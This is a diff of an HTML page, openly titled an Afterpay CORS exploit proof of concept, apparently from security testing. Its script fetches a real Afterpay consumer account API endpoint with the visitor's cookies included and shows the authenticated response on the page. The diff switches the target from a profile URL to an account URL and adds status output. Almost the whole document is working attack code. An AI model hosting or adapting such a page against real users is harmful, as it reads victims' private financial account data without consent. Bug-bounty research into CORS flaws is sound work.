@@ -1,26 +1,31 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>🔥 Afterpay CORS Exploit PoC</title>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Afterpay CORS Exploit PoC</title>
 </head>
 <body>
-  <h2>🔥 Afterpay CORS Exploit PoC2</h2>
+  <h2>🔥 Afterpay CORS Exploit PoC</h2>
   <p>Trying to fetch authenticated content from: <b id="url"></b></p>
-  <pre id="output"></pre>
+  <pre id="output" style="white-space: pre-wrap; background: #eee; padding: 1em; border-radius: 4px;"></pre>
 
   <script>
     // Change this URL to test different endpoints
-    const testUrl = "https://connect.afterpay.com/api/v1/user/profile"; 
+    const testUrl = "https://portalapi.us.afterpay.com/portal/consumers/account";
 
     document.getElementById("url").textContent = testUrl;
 
     fetch(testUrl, {
       method: "GET",
-      credentials: "include"
+      credentials: "include",
+      mode: "cors"
     })
-    .then(res => res.text())
-    .then(data => {
-      document.getElementById("output").textContent = data;
+    .then(async res => {
+      const text = await res.text();
+      document.getElementById("output").textContent =
+        `Status: ${res.status} ${res.statusText}\n\nResponse:\n${text}`;
     })
     .catch(err => {
       document.getElementById("output").textContent = "❌ Error:\n" + err;
